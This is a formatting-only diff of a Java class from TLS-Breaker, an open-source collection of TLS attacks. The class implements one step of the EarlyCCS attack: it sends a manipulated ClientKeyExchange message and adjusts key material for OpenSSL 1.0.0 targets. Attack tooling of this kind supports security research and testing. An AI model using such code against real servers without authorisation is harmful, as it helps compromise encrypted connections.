@@ -1,12 +1,11 @@
-/**
+/*
  * TLS-Breaker - A tool collection of various attacks on TLS based on TLS-Attacker
  *
- * Copyright 2021-2022 Ruhr University Bochum, Paderborn University, Hackmanit GmbH
+ * Copyright 2021-2024 Ruhr University Bochum, Paderborn University, and Hackmanit GmbH
  *
  * Licensed under Apache License, Version 2.0
  * http://www.apache.org/licenses/LICENSE-2.0.txt
  */
-
 package de.rub.nds.tlsbreaker.poodle.actions;
 
 import de.rub.nds.modifiablevariable.util.Modifiable;
@@ -27,9 +26,8 @@ import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
 /**
- * This Action is used by the EarlyCcs Attack. It sends a ClientKeyExchange message and adjusts the cryptographic
- * material accordingly.
- *
+ * This Action is used by the EarlyCcs Attack. It sends a ClientKeyExchange message and adjusts the
+ * cryptographic material accordingly.
  */
 public class EarlyCcsAction extends TlsAction {
 
@@ -40,33 +38,36 @@ public class EarlyCcsAction extends TlsAction {
     private boolean executedAsPlanned = false;
 
     /**
-     * Constructor for the Action. If the target is Openssl 1.0.0 the boolean value should be set to true
+     * Constructor for the Action. If the target is Openssl 1.0.0 the boolean value should be set to
+     * true
      *
-     * @param targetsOpenssl100
-     *                          If the target is an openssl 1.0.0 server
+     * @param targetsOpenssl100 If the target is an openssl 1.0.0 server
      */
     public EarlyCcsAction(Boolean targetsOpenssl100) {
         this.targetOpenssl100 = targetsOpenssl100;
     }
 
     /**
-     * Sends a ClientKeyExchange message depending on the currently selected cipher suite. Depending on the target
-     * version cryptographic material is adjusted.
+     * Sends a ClientKeyExchange message depending on the currently selected cipher suite. Depending
+     * on the target version cryptographic material is adjusted.
      *
-     * @param state
-     *              the State in which the action should be executed in
+     * @param state the State in which the action should be executed in
      */
     @Override
     public void execute(State state) {
         WorkflowConfigurationFactory factory = new WorkflowConfigurationFactory(state.getConfig());
-        ClientKeyExchangeMessage message = factory.createClientKeyExchangeMessage(
-            AlgorithmResolver.getKeyExchangeAlgorithm(state.getTlsContext().getChooser().getSelectedCipherSuite()));
+        ClientKeyExchangeMessage message =
+                factory.createClientKeyExchangeMessage(
+                        AlgorithmResolver.getKeyExchangeAlgorithm(
+                                state.getTlsContext().getChooser().getSelectedCipherSuite()));
         if (!targetOpenssl100) {
             message.setIncludeInDigest(Modifiable.explicit(false));
         }
         message.setAdjustContext(Modifiable.explicit(false));
-        ClientKeyExchangeHandler handler = (ClientKeyExchangeHandler) message.getHandler(state.getTlsContext());
-        byte[] protocolMessageBytes = SendMessageHelper.prepareMessage(message, state.getTlsContext());
+        ClientKeyExchangeHandler handler =
+                (ClientKeyExchangeHandler) message.getHandler(state.getTlsContext());
+        byte[] protocolMessageBytes =
+                SendMessageHelper.prepareMessage(message, state.getTlsContext());
         if (targetOpenssl100) {
             handler.adjustPremasterSecret(message);
             handler.adjustMasterSecret(message);
@@ -76,8 +77,11 @@ public class EarlyCcsAction extends TlsAction {
         Record r = new Record();
         r.setContentMessageType(ProtocolMessageType.HANDSHAKE);
         recordList.add(r);
-        byte[] prepareRecords = state.getTlsContext().getRecordLayer().prepareRecords(protocolMessageBytes,
-            ProtocolMessageType.HANDSHAKE, recordList);
+        byte[] prepareRecords =
+                state.getTlsContext()
+                        .getRecordLayer()
+                        .prepareRecords(
+                                protocolMessageBytes, ProtocolMessageType.HANDSHAKE, recordList);
         try {
             state.getTlsContext().getTransportHandler().sendData(prepareRecords);
             executedAsPlanned = true;
@@ -86,12 +90,9 @@ public class EarlyCcsAction extends TlsAction {
             executedAsPlanned = false;
         }
         setExecuted(true);
-
     }
 
-    /**
-     * Rests the executed state of the action
-     */
+    /** Rests the executed state of the action */
     @Override
     public void reset() {
         setExecuted(false);
@@ -102,5 +103,4 @@ public class EarlyCcsAction extends TlsAction {
     public boolean executedAsPlanned() {
         return executedAsPlanned;
     }
-
 }
